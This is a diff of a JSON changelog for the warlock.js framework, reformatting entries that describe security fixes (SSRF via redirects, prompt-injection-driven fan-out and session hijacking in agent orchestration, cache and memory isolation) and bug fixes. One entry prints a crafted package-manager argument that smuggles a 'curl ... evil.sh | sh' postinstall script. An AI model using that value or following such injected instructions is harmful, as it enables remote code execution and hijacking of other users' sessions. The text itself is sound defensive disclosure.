+              "html": "<strong>The <code>warlock</code> binary was never linked in a yarn-1 scaffold.</strong> Installing the batched features under yarn 1 hit an _Invariant Violation_ in yarn's linker, which aborted the install before <code>node_modules/.bin</code> was written — leaving a scaffolded project whose own <code>warlock</code> command did not exist. <code>App.pinViteResolution()</code> now writes matching <code>resolutions</code> and <code>overrides</code> entries for vite into the generated <code>package.json</code> _before_ the batched feature install runs, so a single vite version is resolved and the linker completes."
             }
           ]
         }
@@ -3520,11 +4058,11 @@
           "items": [
             {
               "type": "Security",
-              "html": "<strong><code>guardedFetch</code> no longer lets the platform follow redirects past the SSRF guard.</strong> The outbound policy validated only the *initial* URL, then handed the request to <code>fetch</code> with automatic redirect following — so a page an agent was asked to load (<code>ai.rag</code>'s <code>loadWeb()</code>, the skills <code>urlSource</code> manifest fetch, <code>prepareAttachmentPart</code>'s remote-text path) could pass validation and then <code>302</code> into <code>http://169.254.169.254/...</code> or an internal service with no re-check. Every hop is now issued with <code>redirect: \"manual\"</code> and its <code>Location</code> is re-run through the full <code>assertUrlAllowed</code> policy (scheme, host allowlist, post-DNS private-IP deny) before being followed, capped at the new <code>OutboundPolicy.maxRedirects</code> (default <code>5</code>). Credential headers (<code>authorization</code>, <code>cookie</code>, <code>proxy-authorization</code>) are stripped when a hop crosses an origin boundary, and <code>303</code>/legacy <code>301</code>/<code>302</code>-on-non-GET hops re-issue as a bodyless GET, matching platform semantics. Callers passing <code>redirect: \"manual\"</code> get the raw 3xx back as before; <code>redirect: \"error\"</code> rejects on any redirect. Regression tests cover the metadata/loopback/private redirect block, the off-allowlist redirect block, the hop cap, and the clean-redirect follow"
+              "html": "<strong><code>guardedFetch</code> no longer lets the platform follow redirects past the SSRF guard.</strong> The outbound policy validated only the _initial_ URL, then handed the request to <code>fetch</code> with automatic redirect following — so a page an agent was asked to load (<code>ai.rag</code>'s <code>loadWeb()</code>, the skills <code>urlSource</code> manifest fetch, <code>prepareAttachmentPart</code>'s remote-text path) could pass validation and then <code>302</code> into <code>http://169.254.169.254/...</code> or an internal service with no re-check. Every hop is now issued with <code>redirect: \"manual\"</code> and its <code>Location</code> is re-run through the full <code>assertUrlAllowed</code> policy (scheme, host allowlist, post-DNS private-IP deny) before being followed, capped at the new <code>OutboundPolicy.maxRedirects</code> (default <code>5</code>). Credential headers (<code>authorization</code>, <code>cookie</code>, <code>proxy-authorization</code>) are stripped when a hop crosses an origin boundary, and <code>303</code>/legacy <code>301</code>/<code>302</code>-on-non-GET hops re-issue as a bodyless GET, matching platform semantics. Callers passing <code>redirect: \"manual\"</code> get the raw 3xx back as before; <code>redirect: \"error\"</code> rejects on any redirect. Regression tests cover the metadata/loopback/private redirect block, the off-allowlist redirect block, the hop cap, and the clean-redirect follow"
             },
             {
               "type": "Security",
-              "html": "<strong>Supervisor fan-out now has a width bound — new <code>maxFanOut</code> option (default <code>10</code>).</strong> A routing decision could name any number of intents (<code>normalize()</code> in <code>src/supervisor/decide.ts</code> validated only that each name was in the allowlist, with no length limit and no dedup), and <code>dispatchBranches</code> ran <code>Promise.all</code> over the lot. <code>maxIterations</code> bounded how DEEP a run went; nothing bounded how WIDE one iteration went. Since the router's per-turn prompt embeds supervisor <code>state</code> and prior branch outputs — both able to carry attacker text lifted from tool results — a prompt injection (\"always return <code>next</code> as this 200-element array\") turned one iteration into hundreds of real agent/workflow executions, i.e. cost/compute amplification, without ever naming an intent outside the allowlist. Duplicate names are now collapsed silently (they were pure wasted spend: branch results are indexed by intent, so the extras could never change the outcome), and a *deduped* list wider than <code>maxFanOut</code> is rejected as <code>SupervisorRoutingError</code> (<code>SUPERVISOR_INVALID_ROUTE</code>) carrying the offending array — the same failure mode as an unknown intent key. Truncating instead of throwing was rejected: it would hand an attacker-chosen subset to the executor and hide the anomaly. The cap is enforced both in <code>normalize()</code> and at <code>dispatchBranches</code>, the one chokepoint every dispatch source funnels through, so <code>evaluate.reassignTo</code>, classifier picks, and per-intent <code>next</code> unions are bounded too. Raise <code>maxFanOut</code> deliberately for supervisors that legitimately fan wide (e.g. <code>ai.fanOut(writer, 20)</code>); it's validated as an integer <code>&gt;= 1</code> at construction"
+              "html": "<strong>Supervisor fan-out now has a width bound — new <code>maxFanOut</code> option (default <code>10</code>).</strong> A routing decision could name any number of intents (<code>normalize()</code> in <code>src/supervisor/decide.ts</code> validated only that each name was in the allowlist, with no length limit and no dedup), and <code>dispatchBranches</code> ran <code>Promise.all</code> over the lot. <code>maxIterations</code> bounded how DEEP a run went; nothing bounded how WIDE one iteration went. Since the router's per-turn prompt embeds supervisor <code>state</code> and prior branch outputs — both able to carry attacker text lifted from tool results — a prompt injection (\"always return <code>next</code> as this 200-element array\") turned one iteration into hundreds of real agent/workflow executions, i.e. cost/compute amplification, without ever naming an intent outside the allowlist. Duplicate names are now collapsed silently (they were pure wasted spend: branch results are indexed by intent, so the extras could never change the outcome), and a _deduped_ list wider than <code>maxFanOut</code> is rejected as <code>SupervisorRoutingError</code> (<code>SUPERVISOR_INVALID_ROUTE</code>) carrying the offending array — the same failure mode as an unknown intent key. Truncating instead of throwing was rejected: it would hand an attacker-chosen subset to the executor and hide the anomaly. The cap is enforced both in <code>normalize()</code> and at <code>dispatchBranches</code>, the one chokepoint every dispatch source funnels through, so <code>evaluate.reassignTo</code>, classifier picks, and per-intent <code>next</code> unions are bounded too. Raise <code>maxFanOut</code> deliberately for supervisors that legitimately fan wide (e.g. <code>ai.fanOut(writer, 20)</code>); it's validated as an integer <code>&gt;= 1</code> at construction"
             },
             {
               "type": "Security",
@@ -3532,7 +4070,7 @@
             },
             {
               "type": "Security",
-              "html": "<strong><code>orchestrator.asTool({ sessionScope: \"shared\" })</code> no longer lets the calling model choose which session it joins.</strong> The wrapper read <code>sessionId</code> (and <code>history</code>) straight out of the *validated tool-call payload* — i.e. out of arguments the outer agent's LLM wrote — and handed them to <code>orchestrator.execute()</code>, which loads that session's checkpoint, merges its persisted <code>state</code>, runs a turn against it and writes a fresh checkpoint back. The JSDoc actively instructed developers to thread the session id through <code>inputSchema</code>. A <code>sessionId</code> is bearer-equivalent to full read/write on the session, so any prompt injection reaching the outer agent (a summarized document, a poisoned tool result, a fetched page) could say \"continue session <code>&lt;victim-id&gt;</code>\" and have the nested orchestrator splice an attacker-directed turn into a stranger's live conversation and return its content — including prior state — into the outer transcript. The target session is now bound OUTSIDE the model-visible schema, via the new <code>OrchestratorAsToolOptions.session</code>: either a literal id fixed at <code>asTool()</code> construction, or a <code>(ctx) =&gt; sessionId | { sessionId, history }</code> resolver reading the invocation's <code>ToolContext</code> (the same out-of-band channel <code>signal</code> / <code>artifacts</code> already travel on, which an LLM cannot write to). <code>sessionId</code> / <code>history</code> are stripped from the payload before it is forwarded as <code>execute(input)</code>, and a resolver that returns nothing fails the call rather than falling back to the payload. <strong>Breaking for <code>\"shared\"</code> scope only:</strong> building such a tool without <code>session</code> now throws at construction. The pre-4.15.0 behavior is still reachable behind <code>unsafeAllowModelSessionId: true</code>, documented at the API surface as bearer-token-equivalent access that obliges the developer to verify session ownership themselves. <code>\"fresh\"</code> scope (the default) is unchanged"
+              "html": "<strong><code>orchestrator.asTool({ sessionScope: \"shared\" })</code> no longer lets the calling model choose which session it joins.</strong> The wrapper read <code>sessionId</code> (and <code>history</code>) straight out of the _validated tool-call payload_ — i.e. out of arguments the outer agent's LLM wrote — and handed them to <code>orchestrator.execute()</code>, which loads that session's checkpoint, merges its persisted <code>state</code>, runs a turn against it and writes a fresh checkpoint back. The JSDoc actively instructed developers to thread the session id through <code>inputSchema</code>. A <code>sessionId</code> is bearer-equivalent to full read/write on the session, so any prompt injection reaching the outer agent (a summarized document, a poisoned tool result, a fetched page) could say \"continue session <code>&lt;victim-id&gt;</code>\" and have the nested orchestrator splice an attacker-directed turn into a stranger's live conversation and return its content — including prior state — into the outer transcript. The target session is now bound OUTSIDE the model-visible schema, via the new <code>OrchestratorAsToolOptions.session</code>: either a literal id fixed at <code>asTool()</code> construction, or a <code>(ctx) =&gt; sessionId | { sessionId, history }</code> resolver reading the invocation's <code>ToolContext</code> (the same out-of-band channel <code>signal</code> / <code>artifacts</code> already travel on, which an LLM cannot write to). <code>sessionId</code> / <code>history</code> are stripped from the payload before it is forwarded as <code>execute(input)</code>, and a resolver that returns nothing fails the call rather than falling back to the payload. <strong>Breaking for <code>\"shared\"</code> scope only:</strong> building such a tool without <code>session</code> now throws at construction. The pre-4.15.0 behavior is still reachable behind <code>unsafeAllowModelSessionId: true</code>, documented at the API surface as bearer-token-equivalent access that obliges the developer to verify session ownership themselves. <code>\"fresh\"</code> scope (the default) is unchanged"
             },
             {
               "type": "Security",
@@ -3540,15 +4078,15 @@
             },
             {
               "type": "Security",
-              "html": "<strong>The working-memory tier is size-bounded — new <code>working: { maxItems }</code> (default <code>1000</code>).</strong> <code>WorkingMemory</code> backed its buffer with a plain <code>Map</code> that grew by one entry per unique <code>remember()</code> and had no cap, TTL or eviction of any kind. It is also the one tier that keeps everything it is told in *process* memory, for the lifetime of the <code>memory()</code> instance — which <code>ai.orchestrator({ memory })</code> resolves ONCE and reuses for every session, for as long as the process runs. Since distinct text derives a distinct id nothing dedups, so an attacker able to drive turns through a memory-backed orchestrator (with <code>remember</code> on by default) added a permanent entry per request until the process ran out of memory: a cheap memory-exhaustion DoS against any internet-facing deployment. The buffer now evicts on overflow. <strong>Policy is FIFO over insertion order, not LRU,</strong> and deliberately so: recall on this tier is a pure recency proxy (it reverses insertion order and slices the newest <code>k</code>, never reordering), so the front of the buffer is by construction the region recall reaches last — FIFO evicts exactly the entries a bounded recall would never have returned, while true LRU would need read-time reordering that would also rewrite the <code>score</code> every recall reports. Re-remembering an existing id still updates in place and keeps its slot. <code>maxItems</code> is validated as an integer <code>&gt;= 1</code> at construction and has no unbounded setting — \"no cap\" is the vulnerability, not a configuration choice; raise it deliberately for a long-lived single-tenant process, and put durable recall in the semantic / episodic tiers, which delegate retention to a <code>CacheDriver</code>. Known and documented limitation: the bound is global rather than per-scope, so a busy session can push another's older entries out — a recall-quality degradation on a volatile scratch tier, never a disclosure (the scope filter still applies), and a per-scope quota would not help against an attacker holding many sessions anyway"
+              "html": "<strong>The working-memory tier is size-bounded — new <code>working: { maxItems }</code> (default <code>1000</code>).</strong> <code>WorkingMemory</code> backed its buffer with a plain <code>Map</code> that grew by one entry per unique <code>remember()</code> and had no cap, TTL or eviction of any kind. It is also the one tier that keeps everything it is told in _process_ memory, for the lifetime of the <code>memory()</code> instance — which <code>ai.orchestrator({ memory })</code> resolves ONCE and reuses for every session, for as long as the process runs. Since distinct text derives a distinct id nothing dedups, so an attacker able to drive turns through a memory-backed orchestrator (with <code>remember</code> on by default) added a permanent entry per request until the process ran out of memory: a cheap memory-exhaustion DoS against any internet-facing deployment. The buffer now evicts on overflow. <strong>Policy is FIFO over insertion order, not LRU,</strong> and deliberately so: recall on this tier is a pure recency proxy (it reverses insertion order and slices the newest <code>k</code>, never reordering), so the front of the buffer is by construction the region recall reaches last — FIFO evicts exactly the entries a bounded recall would never have returned, while true LRU would need read-time reordering that would also rewrite the <code>score</code> every recall reports. Re-remembering an existing id still updates in place and keeps its slot. <code>maxItems</code> is validated as an integer <code>&gt;= 1</code> at construction and has no unbounded setting — \"no cap\" is the vulnerability, not a configuration choice; raise it deliberately for a long-lived single-tenant process, and put durable recall in the semantic / episodic tiers, which delegate retention to a <code>CacheDriver</code>. Known and documented limitation: the bound is global rather than per-scope, so a busy session can push another's older entries out — a recall-quality degradation on a volatile scratch tier, never a disclosure (the scope filter still applies), and a per-scope quota would not help against an attacker holding many sessions anyway"
             },
             {
               "type": "Security",
-              "html": "<strong><code>semanticCache()</code> is per-session-scoped by default — one caller's cached answer is no longer served to another.</strong> The middleware is built once at app boot and shared by every end user, its <code>namespace</code> was a static string, and a hit is returned as a synthetic <code>ModelResponse</code> with no LLM call in between — so both lookup paths (the exact prompt-hash key and the vector <code>similar()</code> match) could serve user A's cached response, personal context and all, to user B's merely *similar* prompt, and let an attacker seed an entry engineered to sit near a predictable class of future queries and have it answered from the store thereafter. Entries now carry a <code>scope</code> derived from the run's own <code>AgentExecuteOptions.sessionId</code> (<code>\"session:&lt;id&gt;\"</code>, the same derivation the memory fix uses) — read out of the execute options, never out of the prompt or the model's output — folded into the stored key (hashed, since a <code>sessionId</code> is caller-supplied and may contain the key delimiter) *and* re-checked as exact equality on the stored entry, so key-level separation is never the thing authorizing a read. The vector path overscans before filtering, mirroring the memory tiers, so a noisy foreign session cannot occupy the top-<code>k</code> and mask a caller's own hit. New <code>SemanticCacheOptions.scope</code>: <code>\"session\"</code> (default), <code>\"shared\"</code> (one pool for every caller — the explicit opt-in for genuinely public Q&amp;A, and the pre-4.15.0 behavior), or <code>(context) =&gt; key</code> for a custom boundary such as per-tenant. <strong>Two behavior changes to expect:</strong> entries written before the upgrade are unscoped and are only read by unscoped runs, and scoping trades cross-user hit rate for isolation — a public FAQ deployment where no response can carry a caller's private context should now set <code>scope: \"shared\"</code> on purpose. Runs made *without* a <code>sessionId</code> continue to share one unscoped pool (unchanged behavior for them); thread <code>sessionId</code> through <code>execute()</code> — composites already do — to get the isolation"
+              "html": "<strong><code>semanticCache()</code> is per-session-scoped by default — one caller's cached answer is no longer served to another.</strong> The middleware is built once at app boot and shared by every end user, its <code>namespace</code> was a static string, and a hit is returned as a synthetic <code>ModelResponse</code> with no LLM call in between — so both lookup paths (the exact prompt-hash key and the vector <code>similar()</code> match) could serve user A's cached response, personal context and all, to user B's merely _similar_ prompt, and let an attacker seed an entry engineered to sit near a predictable class of future queries and have it answered from the store thereafter. Entries now carry a <code>scope</code> derived from the run's own <code>AgentExecuteOptions.sessionId</code> (<code>\"session:&lt;id&gt;\"</code>, the same derivation the memory fix uses) — read out of the execute options, never out of the prompt or the model's output — folded into the stored key (hashed, since a <code>sessionId</code> is caller-supplied and may contain the key delimiter) _and_ re-checked as exact equality on the stored entry, so key-level separation is never the thing authorizing a read. The vector path overscans before filtering, mirroring the memory tiers, so a noisy foreign session cannot occupy the top-<code>k</code> and mask a caller's own hit. New <code>SemanticCacheOptions.scope</code>: <code>\"session\"</code> (default), <code>\"shared\"</code> (one pool for every caller — the explicit opt-in for genuinely public Q&amp;A, and the pre-4.15.0 behavior), or <code>(context) =&gt; key</code> for a custom boundary such as per-tenant. <strong>Two behavior changes to expect:</strong> entries written before the upgrade are unscoped and are only read by unscoped runs, and scoping trades cross-user hit rate for isolation — a public FAQ deployment where no response can carry a caller's private context should now set <code>scope: \"shared\"</code> on purpose. Runs made _without_ a <code>sessionId</code> continue to share one unscoped pool (unchanged behavior for them); thread <code>sessionId</code> through <code>execute()</code> — composites already do — to get the isolation"
             },
             {
               "type": "Security",
-              "html": "<strong>The planner's plan schema rejects an over-long plan at parse time.</strong> Strict-mode JSON Schema cannot express <code>maxItems</code>, so <code>maxSteps</code> was never on the wire (<code>plan-schema.ts</code> discarded the parameter outright with <code>void maxSteps</code>) and the only enforcement was <code>PlannerRun</code>'s tail truncation — which runs *after* the whole <code>steps[]</code> array has been parsed, normalized into <code>PlannerStep[]</code> and stored on <code>this.plan</code>. A provider or proxy that ignores the prompt's step budget could therefore make the planner deserialize an arbitrarily long array before anything trimmed it. <code>validate()</code> now enforces a hard ceiling of <code>maxSteps * 4</code> (or <code>100</code> when <code>planSchema</code> is built without a <code>maxSteps</code>), rejecting rather than truncating: a plan several times its budget is a malfunction worth surfacing as the typed <code>PlannerPlanInvalidError</code>, not a prefix worth silently executing. The slack factor keeps the normal case — a model overshooting \"at most N steps\" slightly, which the runtime still truncates to <code>skipped</code> — working exactly as before"
+              "html": "<strong>The planner's plan schema rejects an over-long plan at parse time.</strong> Strict-mode JSON Schema cannot express <code>maxItems</code>, so <code>maxSteps</code> was never on the wire (<code>plan-schema.ts</code> discarded the parameter outright with <code>void maxSteps</code>) and the only enforcement was <code>PlannerRun</code>'s tail truncation — which runs _after_ the whole <code>steps[]</code> array has been parsed, normalized into <code>PlannerStep[]</code> and stored on <code>this.plan</code>. A provider or proxy that ignores the prompt's step budget could therefore make the planner deserialize an arbitrarily long array before anything trimmed it. <code>validate()</code> now enforces a hard ceiling of <code>maxSteps * 4</code> (or <code>100</code> when <code>planSchema</code> is built without a <code>maxSteps</code>), rejecting rather than truncating: a plan several times its budget is a malfunction worth surfacing as the typed <code>PlannerPlanInvalidError</code>, not a prefix worth silently executing. The slack factor keeps the normal case — a model overshooting \"at most N steps\" slightly, which the runtime still truncates to <code>skipped</code> — working exactly as before"
             }
           ]
         },
@@ -3618,7 +4156,7 @@
             },
             {
               "type": "Security",
-              "html": "<strong><code>http.trustProxy</code> now accepts a hop count or a trusted-proxy list, and <code>detectIp()</code> honours them.</strong> <code>true</code> is the wrong shape for the common topology: an edge that *appends* to <code>X-Forwarded-For</code> leaves whatever the client prepended as the leftmost entry, so \"trust the leftmost hop\" hands the client its own IP back. The config value is passed to Fastify untouched, and <code>detectIp()</code> now reads the resolved client off <code>request.ip</code> instead of re-parsing the header — so both agree, and every Fastify shape works:"
+              "html": "<strong><code>http.trustProxy</code> now accepts a hop count or a trusted-proxy list, and <code>detectIp()</code> honours them.</strong> <code>true</code> is the wrong shape for the common topology: an edge that _appends_ to <code>X-Forwarded-For</code> leaves whatever the client prepended as the leftmost entry, so \"trust the leftmost hop\" hands the client its own IP back. The config value is passed to Fastify untouched, and <code>detectIp()</code> now reads the resolved client off <code>request.ip</code> instead of re-parsing the header — so both agree, and every Fastify shape works:"
             },
             {
               "type": "Dependencies",
@@ -3852,7 +4390,7 @@
           "items": [
             {
               "type": "Security",
-              "html": "<strong><code>--pm</code> is now validated against an allow-list (<code>npm</code>/<code>yarn</code>/<code>pnpm</code>/<code>bun</code>) before it reaches anything.</strong> Previously an arbitrary <code>--pm</code> string flowed straight into <code>spawn()</code> as the executable to run *and* was spliced verbatim into the generated <code>package.json</code>'s script text before that text is parsed as JSON — a crafted value (e.g. <code>--pm='pnpm\",\"postinstall\":\"curl${IFS}evil.sh|sh#'</code>) could inject a <code>postinstall</code> script that the scaffolder's own automatic <code>install()</code> step would then execute, or invoke an arbitrary binary on <code>PATH</code> outright. <code>--yes</code>/non-interactive scaffolds now reject any <code>--pm</code> outside the allow-list and exit before the package manager is set, closing both sinks at the source; the interactive prompt was already safe (its options are drawn from the allow-list, never free text)."
+              "html": "<strong><code>--pm</code> is now validated against an allow-list (<code>npm</code>/<code>yarn</code>/<code>pnpm</code>/<code>bun</code>) before it reaches anything.</strong> Previously an arbitrary <code>--pm</code> string flowed straight into <code>spawn()</code> as the executable to run _and_ was spliced verbatim into the generated <code>package.json</code>'s script text before that text is parsed as JSON — a crafted value (e.g. <code>--pm='pnpm\",\"postinstall\":\"curl${IFS}evil.sh|sh#'</code>) could inject a <code>postinstall</code> script that the scaffolder's own automatic <code>install()</code> step would then execute, or invoke an arbitrary binary on <code>PATH</code> outright. <code>--yes</code>/non-interactive scaffolds now reject any <code>--pm</code> outside the allow-list and exit before the package manager is set, closing both sinks at the source; the interactive prompt was already safe (its options are drawn from the allow-list, never free text)."
             },
             {
               "type": "Dependencies",
@@ -4249,7 +4787,7 @@
             },
             {
               "type": "Changed",
-              "html": "<strong>BREAKING — a conflicting <code>setupTest</code> call rejects instead of being ignored.</strong> While a setup is starting or ready, a call with *different* effective options now rejects with an error naming both the active and the requested selection. The same options remain a no-op, and concurrent identical calls share one startup"
+              "html": "<strong>BREAKING — a conflicting <code>setupTest</code> call rejects instead of being ignored.</strong> While a setup is starting or ready, a call with _different_ effective options now rejects with an error naming both the active and the requested selection. The same options remain a no-op, and concurrent identical calls share one startup"
             },
             {
               "type": "Changed",
@@ -4364,7 +4902,7 @@
             },
             {
               "type": "Fixed",
-              "html": "<strong>A test server that fails to start no longer leaves half of itself running.</strong> <code>startHttpTestServer()</code> publishes the resolved port before the late connector phase and sets <code>isServerRunning</code> only on its last line, so a failure in between left <strong>live early-phase connectors and a published port pointing at a server that never came up</strong> — while <code>stopHttpTestServer()</code> in <code>globalTeardown</code> reported *\"No server to stop\"* and walked away from them. Startup now unwinds what it started, always withdraws the port and resets its state. ⚠ <strong>The error you get back is unchanged — it always was.</strong> Startup had no <code>catch</code> at all, so the original failure already propagated correctly; what was missing was the cleanup, and the new <code>catch</code> exists only to run it. A failure *during* that cleanup is reported and never substituted for the cause, which is the one propagation guarantee the wrapper had to be careful not to break"
+              "html": "<strong>A test server that fails to start no longer leaves half of itself running.</strong> <code>startHttpTestServer()</code> publishes the resolved port before the late connector phase and sets <code>isServerRunning</code> only on its last line, so a failure in between left <strong>live early-phase connectors and a published port pointing at a server that never came up</strong> — while <code>stopHttpTestServer()</code> in <code>globalTeardown</code> reported _\"No server to stop\"_ and walked away from them. Startup now unwinds what it started, always withdraws the port and resets its state. ⚠ <strong>The error you get back is unchanged — it always was.</strong> Startup had no <code>catch</code> at all, so the original failure already propagated correctly; what was missing was the cleanup, and the new <code>catch</code> exists only to run it. A failure _during_ that cleanup is reported and never substituted for the cause, which is the one propagation guarantee the wrapper had to be careful not to break"
             },
             {
               "type": "Fixed",
@@ -4449,7 +4987,7 @@
             },
             {
               "type": "Fixed",
-              "html": "<strong>A build artifact that names an entry point it does not contain is now refused before it can be packed.</strong> An interrupted build leaves a directory that looks finished — <code>package.json</code>, <code>README</code>, <code>CHANGELOG</code>, <code>bin/</code>, <code>skills/</code> — and holds no compiled code at all. Nineteen existed in this tree at once, and nothing in the release path noticed: the only related guard compares <strong>modification times</strong>, so a hollow directory with a freshly written manifest is *newer than source* and passes, and it runs solely on the artifact-reuse path, which is not how the hollow directories were produced"
+              "html": "<strong>A build artifact that names an entry point it does not contain is now refused before it can be packed.</strong> An interrupted build leaves a directory that looks finished — <code>package.json</code>, <code>README</code>, <code>CHANGELOG</code>, <code>bin/</code>, <code>skills/</code> — and holds no compiled code at all. Nineteen existed in this tree at once, and nothing in the release path noticed: the only related guard compares <strong>modification times</strong>, so a hollow directory with a freshly written manifest is _newer than source_ and passes, and it runs solely on the artifact-reuse path, which is not how the hollow directories were produced"
             },
             {
               "type": "Fixed",
@@ -4457,7 +4995,7 @@
             },
             {
               "type": "Fixed",
-              "html": "<strong><code>warlock migrate --rollback=false</code> no longer drops every table.</strong> CLI options were parsed as raw strings and nothing ever coerced them: <code>--rollback=false</code> reached the action as the string <code>\"false\"</code>, <code>if (rollback)</code> saw a truthy value, and the run rolled back *everything*. The declared <code>type: \"boolean\"</code> on the option was decorative — used only to render help. The same shape existed on every boolean option, including <code>warlock drop.tables --force=false</code>, where it turned a confirmation prompt into an unattended drop"
+              "html": "<strong><code>warlock migrate --rollback=false</code> no longer drops every table.</strong> CLI options were parsed as raw strings and nothing ever coerced them: <code>--rollback=false</code> reached the action as the string <code>\"false\"</code>, <code>if (rollback)</code> saw a truthy value, and the run rolled back _everything_. The declared <code>type: \"boolean\"</code> on the option was decorative — used only to render help. The same shape existed on every boolean option, including <code>warlock drop.tables --force=false</code>, where it turned a confirmation prompt into an unattended drop"
             },
             {
               "type": "Fixed",
@@ -4465,7 +5003,7 @@
             },
             {
               "type": "Fixed",
-              "html": "<strong><code>new Image(...)</code> no longer fails depending on how soon you call it.</strong> The <code>Image</code> module fired <code>import(\"sharp\")</code> at load time without awaiting it, and the constructor only checked whether that import had *failed* — never whether it was still in flight. Constructing an image in the first tick after importing the package therefore ran with an undefined sharp function and died with <code>TypeError: sharpFn is not a function</code>; the exact same code passed if something had awaited a timer first. Anything that builds an image during boot — a startup thumbnail job, a module-level warm-up — hit it, and it presented as a mysterious \"works locally, breaks in prod\" timing bug rather than as a missing dependency"
+              "html": "<strong><code>new Image(...)</code> no longer fails depending on how soon you call it.</strong> The <code>Image</code> module fired <code>import(\"sharp\")</code> at load time without awaiting it, and the constructor only checked whether that import had _failed_ — never whether it was still in flight. Constructing an image in the first tick after importing the package therefore ran with an undefined sharp function and died with <code>TypeError: sharpFn is not a function</code>; the exact same code passed if something had awaited a timer first. Anything that builds an image during boot — a startup thumbnail job, a module-level warm-up — hit it, and it presented as a mysterious \"works locally, breaks in prod\" timing bug rather than as a missing dependency"
             },
             {
               "type": "Fixed",
@@ -5031,15 +5569,15 @@
             },
             {
               "type": "Fixed",
-              "html": "<strong>A production bundle no longer imports a package your app does not declare.</strong> <code>warlock build</code>'s generated config loader emitted <code>import config from \"@mongez/config\"</code> — one of *core's* dependencies, never the app's. npm and yarn hoist flat so it resolved by accident; under pnpm's strict layout the shipped bundle died at boot with <code>ERR_MODULE_NOT_FOUND</code> for a package the app had no reason to install. The generator now emits <code>setConfig</code> from <code>@warlock.js/core</code>, which the app does declare, and Node resolves <code>@mongez/config</code> from core's own install — correct under pnpm, and portable, unlike baking absolute paths into an artifact meant to be copied between machines"
+              "html": "<strong>A production bundle no longer imports a package your app does not declare.</strong> <code>warlock build</code>'s generated config loader emitted <code>import config from \"@mongez/config\"</code> — one of _core's_ dependencies, never the app's. npm and yarn hoist flat so it resolved by accident; under pnpm's strict layout the shipped bundle died at boot with <code>ERR_MODULE_NOT_FOUND</code> for a package the app had no reason to install. The generator now emits <code>setConfig</code> from <code>@warlock.js/core</code>, which the app does declare, and Node resolves <code>@mongez/config</code> from core's own install — correct under pnpm, and portable, unlike baking absolute paths into an artifact meant to be copied between machines"
             },
             {
               "type": "Fixed",
-              "html": "<strong><code>env()</code> inside <code>warlock.config.ts</code> no longer always returns its default.</strong> The config module was evaluated *before* any <code>.env</code> file was read, so a project following the documented <code>build: { outdir: env(\"BUILD_OUT\", \"dist\") }</code> recipe silently got <code>dist</code> no matter what the environment said — under every command, <code>dev</code> included, and under <code>build</code> and <code>start</code> env was never loaded at all. Env files are now loaded before <code>warlock.config.ts</code> is evaluated, for every command"
+              "html": "<strong><code>env()</code> inside <code>warlock.config.ts</code> no longer always returns its default.</strong> The config module was evaluated _before_ any <code>.env</code> file was read, so a project following the documented <code>build: { outdir: env(\"BUILD_OUT\", \"dist\") }</code> recipe silently got <code>dist</code> no matter what the environment said — under every command, <code>dev</code> included, and under <code>build</code> and <code>start</code> env was never loaded at all. Env files are now loaded before <code>warlock.config.ts</code> is evaluated, for every command"
             },
             {
               "type": "Fixed",
-              "html": "<strong>An application without <code>src/config/storage.ts</code> can boot again.</strong> The storage connector starts unconditionally, on the documented grounds that <code>storage.init()</code> falls back to a built-in <code>local</code> driver so file storage works out of the box. That fallback was never implemented: <code>init()</code> resolved the default driver *name* and then found nothing registered under it, so any app without a storage config died at boot with <code>Storage driver \"local\" is not configured</code>. A built-in <code>local</code> driver rooted at <code>uploadsPath()</code> is now registered before configured drivers — so an app defining its own <code>local</code> still overrides it, and naming a driver that genuinely does not exist still fails loudly"
+              "html": "<strong>An application without <code>src/config/storage.ts</code> can boot again.</strong> The storage connector starts unconditionally, on the documented grounds that <code>storage.init()</code> falls back to a built-in <code>local</code> driver so file storage works out of the box. That fallback was never implemented: <code>init()</code> resolved the default driver _name_ and then found nothing registered under it, so any app without a storage config died at boot with <code>Storage driver \"local\" is not configured</code>. A built-in <code>local</code> driver rooted at <code>uploadsPath()</code> is now registered before configured drivers — so an app defining its own <code>local</code> still overrides it, and naming a driver that genuinely does not exist still fails loudly"
             },
             {
               "type": "Fixed",
